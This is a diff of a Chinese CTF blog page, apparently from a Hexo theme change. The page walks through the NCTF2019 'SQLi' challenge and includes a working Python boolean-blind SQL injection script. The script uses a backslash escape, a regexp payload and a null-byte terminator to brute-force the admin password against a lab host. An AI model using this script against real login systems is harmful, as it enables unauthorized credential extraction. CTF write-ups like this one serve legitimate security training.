@@ -1,12 +1,68 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>&lt;NCTF2019&gt;SQLi | d0ud</title><script>var config = </script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.4.0/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
- font-family: BenderLight;
- src: local('Bender'), url("/font/BenderLight.ttf");
-}
-@font-face {
- font-family: 'JetBrains Mono';
- src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
-}</style><meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="d0ud" type="application/atom+xml">
-</head><body style="background-image:url(https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg);"><div id="cursor-container"><div id="cursor-outer"></div><div id="cursor-effect"></div></div><main><header><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><ol class="navContent"><li class="navItem"><a href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem"><a href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>&lt;NCTF2019&gt;SQLi</h1></div><hr><div id="post-content"><p>打开题目</p>
+<!DOCTYPE html>
+<html>
+  <head>
+     
+    <meta charset="UTF-8">
+    <title>&lt;NCTF2019&gt;SQLi - d0ud</title>
+    <link rel="shortcut icon" href="/static/img/icon.png">
+    <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
+    
+<link rel="stylesheet" href="/static/kico.css">
+<link rel="stylesheet" href="/static/hingle.css">
+
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/FortAwesome/Font-Awesome/css/font-awesome.min.css">
+
+    <meta name="viewport" content="width=device-width, maximum-scale=1, initial-scale=1"/>
+    <meta property="og:site_name" content="d0ud">
+    <meta property="og:title" content="&lt;NCTF2019&gt;SQLi"/>
+    
+    <style>body:before{ content: ''; background-image: url(https://null-d0ud.github.io/bk.jpg) }</style>
+    
+<meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="d0ud" type="application/atom+xml">
+</head>
+
+  <body>
+    <header>
+    <div class="head-title">
+        <h4>d0ud</h4>
+    </div>
+    <div class="head-action">
+        <div class="toggle-btn"></div>
+        <div class="light-btn"></div>
+        <div class="search-btn"></div>
+    </div>
+    <!--<form class="head-search" method="post">
+        <input type="text" name="s" placeholder="搜索什么？">
+    </form>-->
+    <nav class="head-menu">
+        <a href="/">首页</a>
+        <div class="has-child">
+            <a>分类</a>
+            <div class="sub-menu">
+                <a class="category-link" href="/categories/php/">php</a><a class="category-link" href="/categories/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
+            </div>
+        </div>
+        
+            <a href="/friends">ctfers</a>
+        
+    </nav>
+</header>
+
+    <main>
+    <div class="wrap min">
+        <section class="post-title">
+            <h2>&lt;NCTF2019&gt;SQLi</h2>
+            <div class="post-meta">
+                <time class="date">2021.12.01</time>
+            
+                <span class="category"><a class="category-link" href="/categories/sql%E6%B3%A8%E5%85%A5/">sql注入</a></span>
+            
+            </div>
+        </section>
+        <article class="post-content">
+        
+            <p>打开题目</p>
 <blockquote>
 <p>sqlquery : select * from users where username=’’ and passwd=’’</p>
 </blockquote>
@@ -21,4 +77,72 @@
 <p>根据提示需要获取admin的密码，显然是布尔盲注了</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><br>urll=<span class="hljs-string">&quot;http://6cd4da7b-0239-4646-a44a-8ef97233503e.node4.buuoj.cn:81&quot;</span><br>dataa=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<span class="hljs-string">&quot;passwd&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;<br>passwd=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    <span class="hljs-built_in">print</span>(i,end=<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;qwertyuioplkjhgfdsazxcvbnmAQZXSWEDCVFRTGBNHYUJMKIOLP1234567890_&quot;</span>:<br>        payload=<span class="hljs-string">f&quot;||(passwd/**/regexp/**/\&quot;^<span class="hljs-subst">&#123;passwd&#125;</span><span class="hljs-subst">&#123;w&#125;</span>\&quot;);&quot;</span>+parse.unquote(<span class="hljs-string">&quot;%00&quot;</span>)<br>        dataa[<span class="hljs-string">&quot;passwd&quot;</span>]=payload<br>        response=requests.post(url=urll,data=dataa,allow_redirects=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">302</span>:<br>            passwd+=w<br>            <span class="hljs-built_in">print</span>(passwd)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
 <p>提交密码，得到flag</p>
-<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div id="footer-link" style="right: calc(50% - 1px);order: 1;border-right: 1px solid #fe2;padding-left: unset;max-width: calc(50% - 4px);"><a href="/%5BGWCTF%202019%5D%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/">← Next &lt;GWCTF 2019&gt;枯燥的抽奖</a></div><div id="footer-link" style="left: 50%;order: 0;border-left: 1px solid #fe2;padding-right: unset;max-width: calc(50% - 5px);"><a href="/%5BRCTF2015%5DEasySQL/">&lt;RCTF2015&gt;EasySQL Prev →</a></div></div></div></div><div id="bottom-btn"><a id="to-top" onClick="index.scrolltop();" title="to top" style="opacity: 0; display: none;">∧</a></div></article><div class="aside-box"><aside><div id="aside-top"><div id="about"><a href="/" id="logo"><img src="https://localhost/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">d0ud</a></h1><div id="description"><p></p></div><!--if page.published === undefined--><section id="total"><a id="total-archives" href="/archives"><span class="total-title">Archives Total:</span><span class="total-number">3</span></a><div id="total-tags"><span class="total-title">Tags:</span><span class="total-number">2</span></div><div id="total-categories"><span class="total-title">Categories:</span><span class="total-number">1</span></div></section></div><div id="aside-block"></div></div><footer><text>published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></text><text> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight</a></text><wbr><text>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></text></footer></aside></div></main><canvas id="canvas-dust"></canvas><script>const reset=_=>{}</script><script src="//unpkg.com/@highlightjs/cdn-assets@11.4.0/highlight.min.js"></script><script src="/js/arknights.js"></script><script>document.addEventListener("load",reset())</script></body></html>
+
+        </article>
+        <section class="post-near">
+            <ul>
+                
+                    <li>上一篇: <a href="/%5BGWCTF%202019%5D%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/">&lt;GWCTF 2019&gt;枯燥的抽奖</a></li>
+                
+                
+                    <li>下一篇: <a href="/%5BRCTF2015%5DEasySQL/">&lt;RCTF2015&gt;EasySQL</a></li>
+                
+            </ul>
+        </section>
+        
+            <section class="post-tags">
+            <a class="-none-link" href="/tags/NCTF/" rel="tag">NCTF</a>
+            </section>
+        
+    
+        <section class="post-author">
+        
+            <figure class="author-avatar">
+                <img src="https://null-d0ud.github.io/img/logo.jpg" alt="d0ud" />
+            </figure>
+        
+            <div class="author-info">
+                <h4>d0ud</h4>
+                <p>a ctfer</p>
+            </div>
+        </section>
+    
+    </div>
+</main>
+
+    <footer>
+    <div class="buttons">
+        <a class="to-top" href="#"></a>
+    </div>
+    <div class="wrap min">
+        <section class="widget">
+            <div class="row">
+                <div class="col-m-4">
+                    <h3 class="title-recent">最新文章：</h3>
+                    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/%5BGWCTF%202019%5D%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/"><GWCTF 2019>枯燥的抽奖</a></li><li class="post-list-item"><a class="post-list-link" href="/%5BNCTF2019%5DSQLi/"><NCTF2019>SQLi</a></li><li class="post-list-item"><a class="post-list-link" href="/%5BRCTF2015%5DEasySQL/"><RCTF2015>EasySQL</a></li><li class="post-list-item"><a class="post-list-link" href="/%5BWUSTCTF2020%5D%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/"><WUSTCTF2020>颜值成绩查询</a></li><li class="post-list-item"><a class="post-list-link" href="/GYCTF2020Ezsqli/"><GYCTF2020>Ezsqli</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-date">历史：</h3>
+                    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-tags">标签：</h3>
+                    <a href="/tags/GWCTF/" style="font-size: 10px;">GWCTF</a> <a href="/tags/GYCTF/" style="font-size: 10px;">GYCTF</a> <a href="/tags/NCTF/" style="font-size: 10px;">NCTF</a> <a href="/tags/RCTF/" style="font-size: 10px;">RCTF</a> <a href="/tags/WUSTCTF/" style="font-size: 10px;">WUSTCTF</a>
+                </div>
+            </div>
+        </section>
+        <section class="sub-footer">
+            <p>© 2022 <a href="/">d0ud</a>. All Rights Reserved. Theme By <a href="https://github.com/Dreamer-Paul/Hingle" target="_blank" rel="nofollow">Hingle</a>.</p>
+        </section>
+    </div>
+</footer>
+
+
+<script src="/static/kico.js"></script>
+<script src="/static/hingle.js"></script>
+
+
+<script>var hingle = new Paul_Hingle({"copyright":false,"night":false});</script>
+
+  </body>
+</html>
